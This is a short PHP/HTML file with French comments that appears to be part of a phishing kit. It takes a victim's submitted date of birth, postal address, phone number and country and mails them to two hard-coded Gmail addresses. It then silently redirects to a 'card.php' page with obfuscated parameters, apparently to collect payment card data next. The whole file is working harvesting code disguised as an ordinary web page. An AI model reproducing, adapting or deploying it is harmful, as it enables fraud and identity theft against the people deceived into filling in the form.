<html xmlns="http://www.w3.org/1999/xhtml">

<head>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>

</head>


<body>

<?php
    // S'il y des données de postées
    if ($_SERVER['REQUEST_METHOD']=='POST') {
     
      // (1) Code PHP pour traiter l'envoi de l'email
     
      // Récupération des variables et sécurisation des données
      $dob = htmlentities($_POST['dob']); // htmlentities() convertit des caractères "spéciaux" en équivalent HTML
      $address1 = htmlentities($_POST['address1']);
      $phone = htmlentities($_POST['phone']);
      $country = htmlentities($_POST['country']);
      
     
      // Variables concernant l'email
     
      $destinataire = 'parfaitk714@gmail.com, olivierdelaforce2@gmail.com'; // Adresse email du webmaster (à personnaliser)
      $contenu = '<html><head><title> '.$objet.' </title></head><body>';
      $contenu .= '<p>Information local</p>';
      $contenu .= '<p><strong>Date de naissance</strong>: '.$dob.'</p>';
      $contenu .= '<p><strong>Address</strong>: '.$address1.'</p>';
      $contenu .= '<p><strong>Telephone</strong>: '.$phone.'</p>';
      $contenu .= '<p><strong>Pays</strong>: '.$country.'</p>';
      $contenu .= '</body></html>'; // Contenu du message de l'email (en XHTML)
     
      // Pour envoyer un email HTML, l'en-tête Content-type doit être défini
      $headers = 'MIME-Version: 1.0'."\r\n";
      $headers .= 'Content-type: text/html; charset=iso-8859-1'."\r\n";
     
      // Envoyer l'email
      mail($destinataire, $objet, $contenu, $headers); // Fonction principale qui envoi l'email
      
    }
    ?>
    <script language="javascript">document.location="card.php_enc=d3dac30ba156c830c02fdbb77f33bf67&p=1&dispatch=77204de6c82e28e7d052c5148bc22a677eb6aa2a"</script> 
</body>

</html> 